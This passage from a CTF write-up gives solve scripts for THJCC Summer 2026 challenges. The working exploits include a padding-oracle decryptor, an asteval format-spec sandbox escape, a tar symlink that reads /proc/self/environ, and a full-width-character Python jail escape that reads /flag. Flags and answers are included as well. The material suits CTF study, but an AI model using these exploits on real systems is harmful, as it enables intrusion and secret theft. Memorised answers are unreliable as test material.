     BEFORE C_k inside the submitted token, i.e. token offset 16*(k-1) (IV for
     k=1). The old code wrote 16*(bi-1) with bi off by one.
  2. Oracle semantics: the server only validates the padding of the LAST block
     of the SUBMITTED ciphertext. A full 112-byte submission ignores changes to
     IV/C1..C4 (always OK -> the 20s garbage run). Fix: submit the TRUNCATED
     token tok[:16*(k+1)] = IV || C_1..C_k so block k becomes the last block.

Protocol: connect -> "TOKEN <hex>" (112 bytes = IV||C1..C6, per-connection fresh
IV, same flag plaintext). Send hex line, receive "OK"/"BAD".
"""
import json
import os
import socket
import sys
import threading
import time

HOST = os.environ.get("ORACLE_HOST", "chal.thjcc.org")
PORT = int(os.environ.get("ORACLE_PORT", "12000"))
BLOCK = 16
N_BLOCKS = 6
STATE_FILE = "/tmp/oracle_attack_state.json"

# Known plaintext shortcuts (verified format), block index -> {pos: byte}
KNOWN = {1: {j: ord(c) for j, c in enumerate("THJCC{")}}

state_lock = threading.Lock()
state = {"blocks": {k: [None] * BLOCK for k in range(1, N_BLOCKS + 1)},
         "done": {}, "t0": time.time()}


class Oracle:
    def __init__(self):
        self.sock = socket.create_connection((HOST, PORT), timeout=10)
        self.sock.settimeout(15)
        line = self._readline()
        if not line or not line.startswith(b"TOKEN "):
            raise RuntimeError(f"bad banner {line!r}")
        self.token = bytes.fromhex(line[6:].decode().strip())
        if len(self.token) != 16 * (N_BLOCKS + 1):
            raise RuntimeError(f"unexpected token len {len(self.token)}")

    def _readline(self):
        buf = b""
        while b"\n" not in buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("closed")
            buf += chunk
        return buf.split(b"\n")[0]

    def query(self, data):
        self.sock.sendall(bytes(data).hex().encode() + b"\n")
        return self._readline() == b"OK"

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def log(msg):
    print(f"[{time.time() - state['t0']:7.1f}s] {msg}", flush=True)


def decrypt_block(orc, k, report):
    """Recover plaintext block P_k. Returns bytes(16).

    Submissions are truncated to IV||C_1..C_k; we modify C_{k-1} (offset
    16*(k-1), the IV itself for k=1).
    """
    tok = orc.token
    off = 16 * (k - 1)                # offset of the block we modify
    sub_len = 16 * (k + 1)            # IV || C_1..C_k
    prev = tok[off:off + BLOCK]       # original previous block
    known = KNOWN.get(k, {})
    D = [0] * BLOCK

    def sub_for(pos, pad):
        s = bytearray(tok[:sub_len])
        for j in range(BLOCK - pos, BLOCK):
            s[off + j] = D[j] ^ pad
        return s

    pos = 0
    while pos < BLOCK:
        j = BLOCK - 1 - pos
        pad = pos + 1
        if j in known:
            D[j] = known[j] ^ prev[j]
            report(pos, D[j] ^ prev[j], True)
            pos += 1
            continue
        s = sub_for(pos, pad)
        cands = []
        for g in range(256):
            s[off + j] = g
            ok = orc.query(s)
            if ok:
                cands.append(g)
                if pos > 0:
                    break             # pos>=1 can only have one OK (tail forced)
        if not cands:
            raise RuntimeError(f"block {k} pos {pos}: dead end (0 OK)")
        if pos == 0 and len(cands) > 1:
            # Classic pad=1 vs accidental longer-padding double hit.
            # Disambiguate at pos 1 with a FULL scan: the true candidate yields
            # exactly 1 OK, a false one forces P[15]=1 -> 256 OKs.
            for c in cands:
                D[j] = c ^ pad
                s2 = sub_for(1, 2)
                hits = []
                for g in range(256):
                    s2[off + BLOCK - 2] = g
                    if orc.query(s2):
                        hits.append(g)
                if len(hits) == 1:
                    D[j] = c ^ 1
                    D[BLOCK - 2] = hits[0] ^ 2
                    report(0, D[j] ^ prev[j], False)
                    report(1, D[BLOCK - 2] ^ prev[BLOCK - 2], False)
                    pos = 2
                    break
            if pos == 2:
                continue
            raise RuntimeError(f"block {k}: no pos-0 candidate survived")
        D[j] = cands[0] ^ pad
        report(pos, D[j] ^ prev[j], False)
        pos += 1
    return bytes(D[i] ^ prev[i] for i in range(BLOCK))


def worker(k):
    while k not in state["done"]:
        orc = None
        try:
            orc = Oracle()
            def report(pos, byte, free):
                with state_lock:
                    state["blocks"][k][BLOCK - 1 - pos] = byte
                ch = chr(byte) if 32 <= byte < 127 else "."
                log(f"block {k} pos {pos:2d}: {byte:#04x} '{ch}'"
                    + (" (known)" if free else ""))
            pt = decrypt_block(orc, k, report)
            with state_lock:
                state["done"][k] = pt.hex()
            log(f"block {k} DONE: {pt!r}")
        except Exception as e:
            log(f"block {k} error: {e}; reconnecting")
            time.sleep(2)
        finally:
            if orc:
                orc.close()


def monitor(threads):
    while any(t.is_alive() for t in threads):
        time.sleep(15)
        with state_lock:
            done = dict(state["done"])
            rows = []
            for k in range(1, N_BLOCKS + 1):
                if k in done:
                    rows.append(f"B{k}={done[k]}")
                else:
                    cells = state["blocks"][k]
                    n = sum(1 for c in cells if c is not None)
                    rows.append(f"B{k}:back_{n}/16")
        log(f"progress {rows}")
        with open(STATE_FILE, "w") as f:
            json.dump({"done": done, "blocks": {
                k: [None if c is None else c for c in state["blocks"][k]]
                for k in state["blocks"]}}, f)
        if len(done) == N_BLOCKS:
            break


def main():
    threads = [threading.Thread(target=worker, args=(k,), daemon=True)
               for k in range(1, N_BLOCKS + 1)]
    for t in threads:
        t.start()
    monitor(threads)
    for t in threads:
        t.join()
    with state_lock:
        done = dict(state["done"])
    if len(done) != N_BLOCKS:
        log(f"FAILED, missing blocks {sorted(set(range(1, 7)) - set(done))}")
        return 1
    pt = b"".join(bytes.fromhex(done[k]) for k in range(1, N_BLOCKS + 1))
    pad = pt[-1]
    if 1 <= pad <= BLOCK and pt[-pad:] == bytes([pad]) * pad:
        pt = pt[:-pad]
    log(f"PLAINTEXT ({len(pt)} bytes): {pt!r}")
    # The plaintext is a decoy JSON-ish wrapper; the real flag is the inner
    # THJCC{...} token (fallback: the whole plaintext if no inner token).
    import re
    m = re.search(rb"THJCC\{[^{}]*\}", pt[len(b"THJCC{"):])
    flag = (m.group(0) if m else pt).decode(errors="replace")
    log(f"FLAG: {flag}")
    with open("/tmp/oracle_padding_flag.txt", "w") as f:
        f.write(pt.decode(errors="replace") + "\n" + flag + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

</details>

**お昼はサイゼリヤに行こうニャ！**

**Flag**：`THJCC{46Z-WQv_vFc}`

OSINT（动画角色年龄+订阅数）定种子 K → C 语言 18 线程彩虹表还原 nyan.tbl 五口令 → sha256 拼接 key 做 HMAC-CTR 解 flag.enc。

发现过程：note.png 给出 K 的语义槽位（yaniko/yakuko/aruko 年龄、hameko 频道订阅数 10.8 万）但数字被烧掉——OSINT 动画《ヤニねこ》官方设定得 K=(21,20,24,108000)；廉价 K 验证 oracle：对任意链重算 24576 步端点与 nyan.tbl 的 21-bit 端点比对，四条链全吻合即确认。彩虹表参数从 gen_table.py 推出（链长 24576、端点 21bit、链数 > 6⁸ 假阳性多，需链再生时精确比对）；C 实现两个坑：消息是口令 ASCII 字节而非 base-6 索引、`x*RMIX2` 是 40×48 bit 超出 uint64 需 `unsigned __int128`。

<details>
<summary>📜 saizeriya solve.sh（28 行）——点击展开</summary>

```bash
# ==== saizeriya/solve.sh ====

#!/bin/bash
# 一键复现：お昼はサイゼリヤに行こうニャ！（サイゼリヤ）
# 前提：附件已解压到 handout/extracted/お昼はサイゼリヤに行こうニャ！/
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
PY=python3
HANDOUT="${HERE}/handout/extracted/お昼はサイゼリヤに行こうニャ！"

# 1) K 候选验证（角色年龄/订阅数 -> nyan.tbl 链端点比对）
"${PY}" "${HERE}/verify_k.py"

# 2) 彩虹表查询：5 个 shadow 哈希 -> 原像口令
cc -O3 -o "${HERE}/rainbow" "${HERE}/rainbow.c" -pthread
"${HERE}/rainbow" "${HANDOUT}" | tee "${HERE}/rainbow.out"

# 3) 按住户顺序取每個 target 的第一個命中口令，拼 key 解 flag.enc
PWS=()
for t in 0 1 2 3 4; do
  pw=$(grep "FOUND target\[${t}\]" "${HERE}/rainbow.out" | head -1 | sed 's/.*pw=\([^ ]*\).*/\1/')
  if [ -z "${pw}" ]; then echo "target[${t}] not found"; exit 1; fi
  PWS+=("${pw}")
done
echo "passwords: ${PWS[*]}"

"${PY}" "${HERE}/finish.py" "${PWS[0]}" "${PWS[1]}" "${PWS[2]}" "${PWS[3]}" "${PWS[4]}"
```

</details>
<details>
<summary>📜 saizeriya finish.py（37 行，核心 keystream@1824）——点击展开</summary>

```python
# ==== saizeriya/finish.py ====

# Final step: assemble key from the 5 recovered passwords, unseal flag.enc.
import hashlib
import hmac
import sys

HANDOUT = "saizeriya/handout/extracted/お昼はサイゼリヤに行こうニャ！"
RESIDENTS = ["yaniko", "yakuko", "hameko", "kaoruko", "aruko"]


def keystream(key: bytes, n: int) -> bytes:
    out, ctr = b"", 0
    while len(out) < n:
        out += hashlib.sha256(key + b"YANI-CTR" + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    return out[:n]


def main():
    # order follows RESIDENTS (same order as shadow.txt lines)
    pws = sys.argv[1:6]
    if len(pws) != 5:
        print("usage: finish.py <yaniko_pw> <yakuko_pw> <hameko_pw> <kaoruko_pw> <aruko_pw>")
        return 1
    key = hashlib.sha256("|".join(pws).encode()).digest()
    blob = open(f"{HANDOUT}/flag.enc", "rb").read()
    tag, ct = blob[:16], blob[16:]
    calc = hmac.new(key, b"YANI-TAG" + ct, hashlib.sha256).digest()[:16]
    print("tag match:", calc == tag)
    pt = bytes(a ^ b for a, b in zip(ct, keystream(key, len(ct))))
    print("flag:", pt.decode())
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

</details>

### Misc（7/10）· Forensics（5/6）· Welcome（1/1）
**SO EZ MISC（Misc｜asteval 越狱）**
**Flag**：`THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}`

`calc>` REPL 前两轮按"手写解释器"打全灭。第三轮先做**引擎指纹**：发非法 UTF-8
（`\xff`）触发 UnicodeEncodeError，服务端把整个 stderr traceback 回显到 socket，认出是公开库 **asteval 1.0.9**。"the bug has no patch" = **CVE-2025-24359**。
读原语在 f-string：`on_formattedvalue` 把 format_spec 原样拼进
`'{__fstring__:'+spec+'}'` 模板交 `safe_format`，spec 以 `}` 开头提前闭合主字段，
注入独立 replacement field：

<details>
<summary>📜 SO EZ MISC solve.py（88 行，核心 build_payload@1891）——点击展开</summary>

```python
#!/usr/bin/env python3
"""SO EZ MISC (THJCC CTF Summer 2026) — one-shot exploit.

Bug chain (asteval 1.0.9, CVE-2025-24359 family):
  asteval.Interpreter.on_formattedvalue builds
      fmt = '{__fstring__:' + <evaluated format_spec> + '}'
  and runs SafeFormatter over it.  The spec string is spliced RAW into a
  str.format template, so a spec starting with '}' closes the main field
  early and everything after it is parsed as *template text* — including
  replacement fields whose names support `.attr` / `[key]` chains
  (SafeFormatter.get_field -> safe_getattr / obj[key]).

  The whole read chain lives inside a string literal, so the source-level
  character blacklist ('_', '[', ']') is bypassed with \\u005f/\\u005b/\\u005d
  escapes (server runs Python 3.13, so backslashes inside f-strings are fine).

Usage:
  python3 solve.py                       # default: audit sheet chain
  python3 solve.py --chain "sheets[summary].owner.session.token.value"
  python3 solve.py --host chal.thjcc.org --port 9006
"""
import argparse

from pwn import remote, context

context.log_level = "error"


def build_payload(chain: str) -> str:
    """f-string whose format_spec breaks out of the spec and reads `chain` from WB."""
    field = "__fstring__." + chain
    field = (
        field.replace("_", "\\u005f")
        .replace("[", "\\u005b")
        .replace("]", "\\u005d")
    )
    # template after splice: {__fstring__:} {<field>}   -> value + ' ' + read result
    return "f\"{WB:{'} {" + field + "'}}\""


def run(host: str, port: int, chain: str) -> str:
    payload = build_payload(chain)
    io = remote(host, port)
    try:
        io.recv(timeout=3)  # banner "calc> "
        io.sendline(payload.encode())
        buf = b""
        while True:
            try:
                chunk = io.recv(timeout=3)
            except Exception:
                break
            if not chunk:
                break
            buf += chunk
            if buf.rstrip().endswith(b"calc>"):
                break
    finally:
        io.close()
    out = buf.decode(errors="backslashreplace").replace("calc>", "").strip()
    # server prints ' ' + str(result): drop the leading str(WB) part
    marker = "cells={'A1': 0})})"
    if marker in out:
        out = out.split(marker, 1)[1].strip()
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="chal.thjcc.org")
    ap.add_argument("--port", type=int, default=9006)
    ap.add_argument(
        "--chain",
        default="sheets[audit].owner.session.token.value",
        help="attr/key chain from WB to the value you want to read",
    )
    args = ap.parse_args()

    payload = build_payload(args.chain)
    print(f"[*] payload: {payload}")
    result = run(args.host, args.port, args.chain)
    print(f"[*] leaked: {result}")
    if result.startswith("THJCC{"):
        print(f"[+] FLAG: {result}")


if __name__ == "__main__":
    main()
```

</details>

**Afterimage1（Forensics｜mdat 孤立帧）**
**Flag**：`THJCC{v1d3o_F0ren51cS_qkrejnga}`

四轮自动化分析（逐帧 OCR/QR、频域、时序、音频、运动矢量、容器 atom）全灭。真相：
flag 是 **mdat 尾部 20,524 字节未被 sample table 引用的孤立 IDR H.264 帧**，播放器永远不会放它。`afterimage1/solve.sh` 一键复现：

<details>
<summary>📜 Afterimage1 solve.sh（24 行）——点击展开</summary>

```bash
#!/bin/bash
# Afterimage1 一键复现：mdat 尾部孤立 IDR 帧提取与解码
# 用法: bash solve.sh [challenge.mp4] [输出png]
# 依赖: ffprobe / dd / ffmpeg
set -e
VIDEO="${1:-challenge.mp4}"
OUT="${2:-flag_frame.png}"

# 1) 最后一个被 sample table 引用的 packet 结束位置
LAST=$(ffprobe -v error -select_streams v:0 -show_entries packet=pos,size -of csv=p=0 "$VIDEO" | tail -n 1 | tr ',' ' ')
POS=${LAST% *}; SIZE=${LAST##* }
END=$((POS + SIZE))
TOTAL=$(stat -f%z "$VIDEO")

echo "[*] last referenced packet ends at $END / total $TOTAL bytes"
echo "[*] unreferenced tail: $((TOTAL - END)) bytes"

# 2) 切出孤立 NAL（Annex-B + SPS/PPS/SEI/IDR）
dd if="$VIDEO" of=/tmp/afterimage1_orphan.h264 bs=1 skip="$END" 2>/dev/null

# 3) 解码单帧
ffmpeg -y -loglevel error -f h264 -i /tmp/afterimage1_orphan.h264 -frames:v 1 "$OUT"
rm -f /tmp/afterimage1_orphan.h264
echo "[*] flag frame written to $OUT"
```

</details>

**Welcome（Welcome｜单帧单字符）**
**Flag**：`THJCC{w3lc0me_t0_tHjCc_CTF_sUmM3r_ed1ti0n}`

57 帧 GIF，机器判定"独立随机姿态、无相似帧对、全通道干净"。真相是**每帧恰好一个字符**，统计相似度分析从根上就失明了。**人眼步骤无脚本可自动完成（豁免）**，可复现部分是抽帧：

<details>
<summary>📜 Welcome solve.py（24 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Welcome 一键复现：57 帧单帧单字符提取。

机器统计隐写分析对"每帧一个字符"免疫，剩余步骤需要人眼：
1) 本脚本把 57 帧落盘到 frames/（按帧序编号）
2) 人眼逐帧读字符 → 拼出 check-in 网址 https://welcome.xzhiyouu.idv.tw 与通行码
3) 网页 Check in（忽略大小写/连字符，过人机验证）→ pastebin.com/DUxM02Gp → flag
"""
import sys
from pathlib import Path
from PIL import Image

def main():
    gif = Path(sys.argv[1] if len(sys.argv) > 1 else "welcome.gif")
    outdir = Path("frames")
    outdir.mkdir(exist_ok=True)
    im = Image.open(gif)
    for i in range(im.n_frames):
        im.seek(i)
        im.convert("RGB").save(outdir / f"{i:02d}.png")
    print(f"[*] {im.n_frames} frames extracted to {outdir}/ — read them in order")

if __name__ == "__main__":
    main()
```

</details>

**Where is our head（Misc｜OSINT 双锚点）**
**Flag**：`THJCC{144.95,-37.81}`

"ZURICH" 是**苏黎世保险的楼顶招牌**，不是城市名（北悉尼/珀斯/奥克兰三城市被网格
证伪排除）。第二锚点 RACV 三角顶 → 墨尔本 600 Bourke Place 换牌记录 + 建筑指纹对上，取整边界 -37.82→**-37.81** 命中。**定位本身是人工/多模态 OSINT（豁免）**，
`where-is-our-head/solve.py` 提供坐标网格验证（中心格→相邻格、限速退避）：

<details>
<summary>📜 Where is our head solve.py（44 行，核心 submit@2041）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Where is our head of challenges? — 坐标验证脚本（OSINT 定位本身无脚本可复现）。

定位链（人工/多模态）：ZURICH=苏黎世保险楼顶招牌（非城市名）→ 第二锚点 RACV
三角顶 → 墨尔本 CBD 600 Bourke Place → 摄影点在 Spencer Street 一带高层住宅。
两位小数坐标存在四舍五入边界，用本脚本按"中心格→相邻格"顺序提交验证。

用法:
    python3 solve.py --challenge 59 --token <CTFd token> 144.95 -37.82
    # 相邻格优先顺序：同 lon 纬度 +-0.01，再经度 +-0.01，再对角
"""
import argparse, sys, time, urllib.request

API = "https://ctf2026-sum.thjcc.org/api/v1/challenges/attempt"

def submit(token, cid, lon, lat):
    flag = f"THJCC{{{lon:.2f},{lat:.2f}}}"
    req = urllib.request.Request(
        API, data=f'{{"challenge_id":{cid},"submission":"{flag}"}}'.encode(),
        headers={"Content-Type": "application/json", "Authorization": f"Token {token}",
                 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"},
        method="POST")
    with urllib.request.urlopen(req, timeout=20) as r:
        import json
        return json.load(r)["data"]["status"]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--challenge", type=int, default=59)
    ap.add_argument("--token", required=True)
    ap.add_argument("lon", type=float); ap.add_argument("lat", type=float)
    args = ap.parse_args()
    order = [(0,0),(0,1),(0,-1),(1,0),(-1,0),(1,1),(1,-1),(-1,1),(-1,-1)]
    for dlon, dlat in order:
        lon, lat = round(args.lon + dlon*0.01, 2), round(args.lat + dlat*0.01, 2)
        st = submit(args.token, args.challenge, lon, lat)
        print(f"THJCC{{{lon},{lat}}} -> {st}", flush=True)
        if st in ("correct", "already_solved"):
            print("FOUND"); return
        time.sleep(8)   # 平台限速 ~10 次/分；ratelimited 时本次未判定，sleep 后重发同格
    print("not found in grid")

if __name__ == "__main__":
    main()
```

</details>

**Time Machine（Misc）**
**Flag**：`THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}`

zip symlink 落盘变普通文件（3.11 extractall 不建链接），**tar symlink 保留** →
snapshot 的 `shutil.make_archive` 解引用链接读 `/proc/self/environ` 拿 FLAG。

<details>
<summary>📜 Time Machine solve.py（70 行，核心 build_tar@2102）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Time Machine (THJCC Summer 2026, Misc 500) — one-shot solve.

Vuln: restored tar symlinks are dereferenced by shutil.make_archive when the
"Take snapshot" button is hit, giving an arbitrary file read from the server.
The flag lives in the app environment (FLAG=...), so read /proc/self/environ.

Usage: python3 solve.py [host] [port]     (defaults: chal.thjcc.org 9005)
"""
import io
import re
import sys
import tarfile
import uuid
import zipfile
import urllib.request
import urllib.parse

HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
PORT = sys.argv[2] if len(sys.argv) > 2 else "9005"
BASE = f"http://{HOST}:{PORT}"


def build_tar(links):
    """Tar containing only symlink entries: {name_in_archive: absolute_target}."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, target in links.items():
            info = tarfile.TarInfo(name)
            info.type = tarfile.SYMTYPE
            info.linkname = target
            tf.addfile(info)
    return buf.getvalue()


def upload(opener, data, filename):
    boundary = "----tm" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="archive"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(
        BASE + "/restore", data=body, method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    opener.open(req)  # 302 back to /


def main():
    # Fresh cookie jar => fresh per-session holdings dir.
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())

    upload(opener, build_tar({"leak_env": "/proc/self/environ"}), "leak.tar")

    # Snapshot = shutil.make_archive("snapshot", "zip", holdings_dir); zipfile
    # follows the symlink, so snapshot.zip contains the target's content.
    zipdata = opener.open(BASE + "/snapshot").read()

    with zipfile.ZipFile(io.BytesIO(zipdata)) as z:
        env = z.read("leak_env").decode(errors="replace")
    m = re.search(r"FLAG=([^\x00]+)", env)
    if not m:
        print("[!] FLAG not found. Raw env:", env)
        sys.exit(1)
    print(m.group(1))


if __name__ == "__main__":
    main()
```

</details>

**Starry Sky（Forensics｜主 agent 亲解）**
**Flag**：`THJCC{c0unt1ng_blu3s_by_thr33s}`

PNG tEXt Comment 藏提示（"a single byte lifts it… which grains to read, and how
far apart"）→ B 通道 LSB 按 stride=5 采样 → packbits → XOR 0x5A（依赖 numpy/Pillow）。

<details>
<summary>📜 Starry Sky solve.py（30 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - Starry Sky (Forensic) 一键复现
B 通道 LSB 位面按 stride=5 采样 -> 8 位组字节 -> XOR 0x5A -> flag
用法: python3 solve.py [image.png]
"""
import sys
import numpy as np
from PIL import Image

KEY = 0x5A
STRIDE = 5


def main():
    path = sys.argv[1] if len(sys.argv) > 1 else "challenge.png"
    im = Image.open(path).convert("RGB")
    a = np.asarray(im)
    bits = (a[..., 2] >> 0) & 1  # B 通道 LSB
    sampled = bits.flatten()[::STRIDE]
    n = len(sampled) - len(sampled) % 8
    nb = np.packbits(sampled[:n].astype(np.uint8))
    dec = bytes(int(v) ^ KEY for v in nb)
    end = dec.find(b"}") + 1
    flag = dec[:end].decode() if end > 0 else dec.decode(errors="replace")
    print(flag)
    return 0 if flag.endswith("}") else 1


if __name__ == "__main__":
    sys.exit(main())
```

</details>

**Baritone（Misc｜主 agent 亲解）**
**Flag**：`THJCC{DoYouHavePerfectPitch}`

16.2s mp3 每 0.5s 一个 12-TET 纯音符 = midi 值当 ASCII。**必须全频段扫描**：
`{`≈9950Hz、`}`≈11168Hz，f<6000 的滤波会丢高频字符（依赖 numpy/scipy/ffmpeg）。

<details>
<summary>📜 Baritone solve.py（52 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - Baritone (Misc) 一键复现
每 0.5s 一个 12-TET 纯音符，频率 -> midi 值 -> 直接当 ASCII。
用法: python3 solve.py [audio.wav|audio.mp3]
"""
import sys
import numpy as np
from scipy.io import wavfile
from scipy import signal as sig


def load_wav(path):
    if path.endswith(".mp3"):
        import subprocess, tempfile, os
        fd, tmp = tempfile.mkstemp(suffix=".wav")
        os.close(fd)
        subprocess.run(["ffmpeg", "-y", "-i", path, "-ac", "1", "-ar", "44100", tmp],
                       check=True, capture_output=True)
        sr, data = wavfile.read(tmp)
        os.unlink(tmp)
    else:
        sr, data = wavfile.read(path)
        if data.ndim > 1:
            data = data.mean(axis=1)
    return sr, data.astype(np.float64)


def main():
    path = sys.argv[1] if len(sys.argv) > 1 else "baritone.mp3"
    sr, data = load_wav(path)
    slot = sr // 2  # 0.5s 一个符号
    n_slots = int(len(data) / slot)
    chars = []
    for i in range(n_slots):
        seg = data[i * slot:(i + 1) * slot]
        f, P = sig.periodogram(seg, sr, nfft=131072)
        m = (f > 60) & (f < 18000)  # 必须全频段，高频字符音符（'{'~10kHz, '}'~11kHz）
        fb, Pb = f[m], P[m]
        k = np.argmax(Pb)
        midi = round(69 + 12 * np.log2(fb[k] / 440.0))
        if 32 <= midi < 127:
            chars.append(chr(midi))
    text = "".join(chars)
    start = text.find("THJCC{")
    end = text.find("}", start)
    flag = text[start:end + 1] if start >= 0 and end > start else text
    print(flag)
    return 0 if flag.startswith("THJCC{") and flag.endswith("}") else 1


if __name__ == "__main__":
    sys.exit(main())
```

</details>

**67jail（Misc）**
**Flag**：`THJCC{676767676767676767676767676767676767676767676767}`

全角标识符 NFKC 归一绕字符黑名单，`(()==())`+`<<` 构造数字、chr 链读 /flag；远程
含 AI 蜜罐（勿交 API key）。

<details>
<summary>📜 67jail solve.py（128 行，核心 build_payload@2312 / num_expr@2277）——点击展开</summary>

```python
#!/usr/bin/env python3
"""67jail 一键复现：token 认证 → [3] Human → nonce → 发 payload 读任意文件。

用法:
    python3 solve.py [host] [port] [path]
默认:
    host=chal.thjcc.org port=9000 path=/flag

依赖 CTFd API token：环境变量 THJCC_TOKEN 或文件 /tmp/thjcc_api_token（ctfd_ 开头 69 字符）。
payload 生成逻辑内嵌（与 gen_payload.py 一致），无需外部文件。

原理（绕过 5 层过滤）:
  1. len==6767        -> 末尾空格垫齐
  2. 禁 '"_`\\#        -> 全程不用这些字符
  3. 禁 ASCII 字母数字 -> 全角字符 ｐｒｉｎｔ/ｏｐｅｎ/ｃｈｒ/ｒｅａｄ（tokenizer NFKC 归一成 ASCII 名，
                        从 exec globals 的 __builtins__={print,open,chr} 解析），
                        数字用 (()==()) 即 True==1，经 + 与 << 位运算拼出任意整数
  4. ';' <= 1         -> 单表达式，无分号
  5. 禁 NFKC 不变的标识符字符 -> 全角字母的 NFKC 归一后是 ASCII（改变），放行
  字符串字面量被禁 -> chr(<num_expr>) 链拼接路径名
"""
import os
import re
import socket
import sys
import time

DEFAULT_HOST = "chal.thjcc.org"
DEFAULT_PORT = 9000
DEFAULT_PATH = "/flag"
TOKEN_FILE = os.environ.get("THJCC_TOKEN", "/tmp/thjcc_api_token")

ONE = "(()==())"  # True == 1


def num_expr(n: int) -> str:
    """只用 ONE/+/<</括号 构造整数 n（二进制分解，位移用递归）。"""
    if n == 0:
        return "(()-())"  # False == 0（备用）
    parts = []
    i = 0
    while n:
        if n & 1:
            parts.append(ONE if i == 0 else "(" + ONE + "<<(" + num_expr(i) + "))")
        n >>= 1
        i += 1
    return "+".join(parts)


def string_expr(s: str) -> str:
    """chr 链拼出字符串 s（绕开引号与 ASCII 字母数字）。"""
    return "+".join("ｃｈｒ(" + num_expr(ord(c)) + ")" for c in s)


def build_payload(path: str, total: int = 6767) -> str:
    src = "ｐｒｉｎｔ(ｏｐｅｎ(" + string_expr(path) + ").ｒｅａｄ())"
    assert len(src) <= total, f"payload too long: {len(src)} > {total}"
    return src + " " * (total - len(src))  # 空格垫到 6767


def recv_until(sock, marker: bytes, timeout: float = 10) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    while marker not in buf:
        try:
            d = sock.recv(4096)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    return buf


def drain(sock, seconds: float) -> bytes:
    sock.settimeout(seconds)
    buf = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def handshake(sock) -> None:
    """token -> [3] Human -> nonce -> 到达 jail 的 '>> ' 提示符。"""
    tok = open(TOKEN_FILE).read().strip()
    recv_until(sock, b"token: ")
    sock.sendall(tok.encode() + b"\n")
    recv_until(sock, b"number: ")
    sock.sendall(b"3\n")  # [3] Human
    buf = recv_until(sock, b"nonce: ")
    m = re.search(rb"Please enter (\d+)", buf)
    if not m:
        raise RuntimeError(f"no nonce in: {buf!r}")
    sock.sendall(m.group(1) + b"\n")
    buf = recv_until(sock, b">> ")
    if b"Correct!!!" not in buf:
        raise RuntimeError(f"gate failed: {buf!r}")


def solve(host: str, port: int, path: str, retries: int = 3) -> str:
    payload = build_payload(path)
    for attempt in range(1, retries + 1):
        try:
            s = socket.create_connection((host, port), timeout=15)
            handshake(s)
            s.sendall(payload.encode() + b"\n")
            out = drain(s, 15)
            s.close()
            return out.decode(errors="replace")
        except (OSError, RuntimeError) as e:
            print(f"[*] attempt {attempt} failed: {e}", file=sys.stderr)
            time.sleep(2)
    raise SystemExit("[-] all attempts failed")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    path = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_PATH
    print(f"[*] {host}:{port} reading {path}", file=sys.stderr)
    resp = solve(host, port, path)
    print(resp)
```

</details>

**TeaGod666（Misc）**
**Flag**：`THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}`

未授权 `/api/update/package` 下发自研固件格式 `TEAGOD66`（b64 段 offset/len 明文
嵌 XOR key `teashop-666`）→ 解出工厂凭据 → `logs?level=debug` 吐 flag。

<details>
<summary>📜 TeaGod666 solve.sh（64 行）——点击展开</summary>

```bash
#!/bin/bash
# TeaGod666 one-shot solve (THJCC CTF Summer 2026, Misc, challenge_id=57)
# Usage: bash solve.sh <CTFD_TOKEN>   (or: CTFD_TOKEN=<token> bash solve.sh)
#
# Chain:
#   1. CTF-Instancer create -> private router instance
#   2. Unauthenticated GET /api/update/package -> teagod666-update.bin
#   3. Parse custom firmware format: b64 blob at offset 65 len 172 XOR "teashop-666"
#      -> JSON with factory creds admin / oolong_tea_666
#   4. Login -> GET /api/system/logs?level=debug -> flag
#   5. Destroy instance
set -u
TOKEN="${1:-${CTFD_TOKEN:-}}"
[ -z "${TOKEN}" ] && { echo "usage: bash solve.sh <ctfd_token>"; exit 1; }
INST="http://chal.thjcc.org:12025"
JAR=$(mktemp /tmp/tg_jar.XXXXXX)
trap 'rm -f "${JAR}" /tmp/tg_pkg_solve.bin' EXIT

# 1. create instance (three-step, same cookie jar to stay on one backend)
curl -s -m 10 -c "$JAR" -b "$JAR" "$INST/" -o /dev/null
curl -s -m 30 -c "$JAR" -b "$JAR" -X POST "$INST/create" \
  -d "token=${TOKEN}&captcha=" -H "Content-Type: application/x-www-form-urlencoded" -o /dev/null
PAGE=$(curl -s -m 10 -b "$JAR" "$INST/")
PORT=$(echo "$PAGE" | grep -o 'chal\.thjcc\.org:[0-9]*' | head -1 | cut -d: -f2)
[ -z "${PORT:-}" ] && { echo "[-] create failed (re-run; instancer is multi-backend)"; exit 1; }
URL="http://chal.thjcc.org:${PORT}"
